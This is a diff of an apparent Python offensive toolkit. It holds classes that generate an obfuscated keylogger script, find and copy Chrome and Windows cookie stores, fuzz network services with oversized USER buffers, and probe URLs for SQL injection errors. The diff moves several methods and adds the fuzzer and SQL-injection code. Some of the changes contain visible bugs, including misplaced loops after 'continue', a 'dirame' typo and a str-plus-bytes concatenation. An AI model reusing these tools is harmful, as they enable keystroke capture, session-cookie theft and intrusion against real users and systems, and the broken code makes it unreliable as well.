@@ -8,29 +8,19 @@ from platform import *
 from shutil import copy
 from bs4 import BeautifulSoup
 
-
 class ArgParser(ArgumentParser):
     # Program Usage. Returns arguments being passed
-    pass
-
     def add_option(self, option1, option2, descr=''):
         self.add_argument(option1, option2, help=descr)
 
     def parse(self):
         return self.parse_args()
 
-
 class Seeker(object):
     # loops  files given path and matches a particular string.
     def __init__(self):
         self.count = []
 
-    def search_file(self, filename, path):
-        for path, directories, files in os.walk(path):
-            for file in files:
-                if filename.lower() in file.lower():
-                    print(os.path.join(path, file))
-                    self.count.append(file)
     def __len__(self):
         return len(self.count)
 
@@ -41,6 +31,12 @@ class Seeker(object):
         if error:
             print(error)
 
+    def search_file(self, filename, path):
+        for path, directories, files in os.walk(path):
+            for file in files:
+                if filename.lower() in file.lower():
+                    print(os.path.join(path, file))
+                    self.count.append(file)
 
 class System(object):
     # Attempts To Find System Hardware, Hostname and Operating System.
@@ -50,10 +46,6 @@ class System(object):
         self.hostname = node()
         self.processor = processor()
 
-    def get(self):
-        # Output The Result
-        return self.platform, self.architecture, self.hostname, self.processor
-
     def __enter__(self):
         return self
 
@@ -61,17 +53,15 @@ class System(object):
         if error:
             print(error)
 
+    def get(self):
+        # Output The Result
+        return self.platform, self.architecture, self.hostname, self.processor
 
 class Ip(object):
     # Fetches ip using http://checkip.dyndns.org
     def __init__(self):
         self.url = 'http://checkip.dyndns.org'
 
-    def get(self):
-        request = requests.get(self.url)
-        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
-        return ip
-
     def __enter__(self):
         return self
 
@@ -79,6 +69,10 @@ class Ip(object):
         if error:
             print(error)
 
+    def get(self):
+        request = requests.get(self.url)
+        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
+        return ip
 
 class Keylogger(object):
     # Generates a keylogger script
@@ -128,11 +122,6 @@ class Keylogger(object):
         self.code += "\x6b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x3d\x20\x4b\x65"
         self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x28\x29"
 
-    def save(self, filename):
-        with open(filename, 'w') as source:
-            source.write(self.code)
-            source.close()
-
     def __len__(self):
         return len(self.code)
 
@@ -143,17 +132,17 @@ class Keylogger(object):
         if error:
             print(error)
 
+    def save(self, filename):
+        with open(filename, 'w') as source:
+            source.write(self.code)
+            source.close()
 
 class Scrape(object):
     # Fecthes a Specific page and finds links
     def __init__(self, page):
-        self.page = requests.get('http://{}/'.format(page))
+        self.page = requests.get(page)
         self.content = self.page.content
         self.href_parser = BeautifulSoup(self.content, "html.parser")
-
-    def scrape(self):
-        for link in self.href_parser.findAll('a'):
-            print(link.get('href'))
 
     def __len__(self):
         return len(self.href_parser.findAll('a'))
@@ -165,6 +154,9 @@ class Scrape(object):
         if error:
             print(error)
 
+    def scrape(self):
+        for link in self.href_parser.findAll('a'):
+            print(link.get('href'))
 
 class Cookiemonster(object):
     # Fetches locally stored cookies
@@ -183,27 +175,6 @@ class Cookiemonster(object):
                                 'C:\\users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'.format(self.user),
                                 'C:\\Users\\{}\\AppData\\Local\\Microsoft\\Windows\\INetCookies'.format(self.user)]
 
-    def show(self):
-        for paths in self.cookie_paths:
-            continue
-        for file in tqdm(os.listdir(paths)):
-            try:
-                print(os.path.join(paths, file))
-            except Exception as e:
-                pass
-
-    def save(self, path, dirname):
-        cookiejar = os.path.join(path, dirname)
-        if not os.path.exists(cookiejar):
-            os.mkdir(dirame)
-        for paths in self.cookie_paths:
-            continue
-        for file in os.listdir(paths):
-            try:
-                copy(os.path.join(paths, file), cookiejar)
-            except Exception as e:
-                pass
-
     def __len__(self):
         for paths in self.cookie_paths:
             continue
@@ -221,6 +192,26 @@ class Cookiemonster(object):
         if error:
             print(error)
 
+    def show(self):
+        for paths in self.cookie_paths:
+            continue
+            for file in tqdm(os.listdir(paths)):
+                try:
+                    print(os.path.join(paths, file))
+                except Exception as e:
+                    pass
+
+    def save(self, path, dirname):
+        cookiejar = os.path.join(path, dirname)
+        if not os.path.exists(cookiejar):
+            os.mkdir(dirame)
+            for paths in self.cookie_paths:
+                continue
+                for file in os.listdir(paths):
+                    try:
+                        copy(os.path.join(paths, file), cookiejar)
+                    except Exception as e:
+                        pass
 
 class NetFuzzer(object):
     # Fuzzer For Network Services
@@ -229,15 +220,8 @@ class NetFuzzer(object):
         self.host = host
         self.port = port
 
-    def fuzz(self, chars, length, timeout, recvbuffer):
-        self.Buffer = chars * length
-        self.sock.settimeout(timeout)
-        self.sock.connect((self.host, self.port))
-        self.sock.send(self.Buffer.encode())
-        return self.sock.recv(recvbuffer).decode(),
-
     def __len__(self):
-        return len(self.Buffer)
+        return len(self.buffer)
 
     def __enter__(self):
         return self
@@ -245,3 +229,46 @@ class NetFuzzer(object):
     def __exit__(self, type, error, traceback):
         if error:
             print(error)
+
+    def buildbuffer(self, chars, length):
+        self.buffer = chars * length
+        return self.buffer
+
+    def fuzz(self, recvsize):
+        self.sock.settimeout(5)
+        self.sock.connect((self.host, self.port))
+        self.sock.send("USER " + self.buffer.encode() + "\r\n")
+        while True:
+            return self.sock.recv(recvsize)
+
+    def status(self):
+        service = socket()
+        service.connect((self.host, self.port))
+        if service.recv(1024):
+            return True
+        return False
+
+class SQLInject(object):
+    # SQL Injection
+    def __init__(self, url):
+        self.errors = []
+        self.url = url
+
+    def __len__(self):
+        return len(self.errors)
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        if error:
+            print(error)
+
+    def urlinject(self, injection):
+        page = requests.get(self.url + injection)
+        errors = re.findall('You have an error in your SQL syntax;', page.content)
+        for error in errors:
+            if error:
+                self.errors.append(error)
+                return True
+        return False
